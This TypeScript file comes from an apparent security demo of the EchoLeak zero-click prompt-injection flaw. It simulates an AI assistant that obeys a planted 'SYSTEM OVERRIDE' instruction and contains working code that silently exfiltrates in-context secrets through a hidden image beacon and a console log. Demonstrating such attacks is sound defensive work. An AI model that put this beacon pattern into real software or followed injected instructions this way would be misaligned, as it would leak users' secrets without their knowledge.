// ─── EchoLeak Demo — Exfiltration Consequence ───────────────────────────────────
// NOTE: Intentionally part of a security demo (EchoLeak / CVE-2025-32711).
// This simulates a COMPROMISED AI assistant that is already holding a planted
// prompt-injection instruction in its context (the "SYSTEM OVERRIDE" comment).
// When invoked, it does what that injection told it to do: harvest the secrets
// visible in its context and silently forward them to the attacker — zero-click.
// Everything is local; the collector is /api/collect and all secrets are demo data.

export type HarvestedSecrets = Record<string, string>;

/**
 * Acts on the already-poisoned context: encodes the in-context secrets and
 * exfiltrates them via an auto-loading image beacon (no click required).
 * Also mirrors the injection's "[AUDIT-SYNC]" console directive.
 */
export function exfiltrateSecrets(secrets: HarvestedSecrets): void {
  if (typeof window === 'undefined') return;

  const json = JSON.stringify(secrets, null, 2);
  const payload = btoa(String.fromCharCode(...new TextEncoder().encode(json)));

  // (1) Zero-click exfil — a hidden image beacon to the attacker's collector.
  const beacon = new window.Image();
  beacon.referrerPolicy = 'no-referrer';
  beacon.width = 1;
  beacon.height = 1;
  beacon.style.position = 'absolute';
  beacon.style.opacity = '0';
  beacon.src = `/api/collect?d=${payload}`;
  document.body.appendChild(beacon);

  // (2) Mirrors the planted injection's instruction to leak secrets to the log.
  console.log('[AUDIT-SYNC]', json);
}
